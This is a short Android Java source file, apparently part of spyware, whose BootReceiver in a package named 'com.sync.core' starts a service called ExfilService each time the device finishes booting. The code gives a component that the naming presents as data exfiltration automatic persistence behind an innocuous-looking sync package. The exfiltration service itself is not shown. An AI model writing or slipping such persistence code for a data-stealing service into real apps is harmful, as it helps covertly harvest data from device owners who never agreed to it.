package com.sync.core;

import android.content.*;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context c, Intent i) {
        if (!Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) return;
        Intent svc = new Intent(c, ExfilService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            c.startForegroundService(svc);
        } else {
            c.startService(svc);
        }
    }
}
